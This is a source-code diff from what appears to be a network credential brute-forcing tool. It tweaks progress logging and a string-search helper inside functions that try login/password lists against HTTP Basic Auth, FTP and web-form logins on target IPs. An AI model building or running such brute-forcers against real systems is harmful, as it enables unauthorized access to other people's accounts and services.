@@ -241,10 +241,10 @@ char *_getAttributeValue(char *str, char *val, char *ip, int port)
 	if(ptrStart != NULL)
 	{
 		if(strstri(ptrStart, "qop=auth") != NULL) return "auth";
-		ptrS1End = _findFirstOcc(ptrStart, "\"");
+		ptrS1End = _findFirst(ptrStart, "\"");
 		if(ptrS1End != NULL)
 		{
-			ptrS2End = _findFirstOcc(ptrS1End + 1, "\"");
+			ptrS2End = _findFirst(ptrS1End + 1, "\"");
 			if(ptrS2End != NULL)
 			{
 				int sz = ptrS2End - ptrS1End - 1;
@@ -688,7 +688,8 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 							Activity += x;
 							strncat(recvBuff, recvBuff2, x);
 						};
-						if(BALogSwitched) stt->doEmitionBAData("Checked BA: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(curLogin) + ":" + QString(curPass) + ";	- Progress: (" + QString::number((passCounter++/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
+						if(BALogSwitched) stt->doEmitionBAData("Checked BA: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(curLogin) + ":" + QString(curPass) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
+						++passCounter;
 					}
 					else
 					{
@@ -1101,7 +1102,8 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 								Activity += strlen(request);
 								ZeroMemory(request, sizeof(request));
 
-								if(BALogSwitched) stt->doEmitionBAData("Probing FTP: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(loginLst[i]) + ":" + QString(passLst[j]) + ";	- Progress: (" + QString::number((passCounter++/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
+								if(BALogSwitched) stt->doEmitionBAData("Probing FTP: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(loginLst[i]) + ":" + QString(passLst[j]) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
+								++passCounter;
 							}
 							else
 							{
@@ -1830,7 +1832,8 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 				if(port == 443) cRes = con._EstablishSSLConnection(ip, port, request, &CSTR);
 				else cRes = con._EstablishConnection(ip, port, request, &CSTR);
 
-				if(BALogSwitched) stt->doEmitionBAData("Checked WF: " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(wfLoginLst[i]) + ":" + QString(wfPassLst[j]) + ";	- Progress: (" + QString::number((passCounter++/(double)(MaxWFPass*MaxWFLogin)) * 100).mid(0, 4) + "%)");
+				if(BALogSwitched) stt->doEmitionBAData("Checked WF: " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(wfLoginLst[i]) + ":" + QString(wfPassLst[j]) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxWFPass*MaxWFLogin)) * 100).mid(0, 4) + "%)");
+				++passCounter;
 
 				if(CSTR.lowerBuff != NULL)
 				{
@@ -1955,7 +1958,8 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 
 				strcat(request, argData);
 
-				if(BALogSwitched) stt->doEmitionBAData("Checked WF: " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(wfLoginLst[i]) + ":" + QString(wfPassLst[j]) + ";	- Progress: (" + QString::number((passCounter++/(double)(MaxWFPass*MaxWFLogin)) * 100).mid(0, 4) + "%)");
+				if(BALogSwitched) stt->doEmitionBAData("Checked WF: " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(wfLoginLst[i]) + ":" + QString(wfPassLst[j]) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxWFPass*MaxWFLogin)) * 100).mid(0, 4) + "%)");
+				++passCounter;
 
 				if(port == 443) cRes = con._EstablishSSLConnection(ip, port, request, &CSTR);
 				else cRes = con._EstablishConnection(ip, port, request, &CSTR);
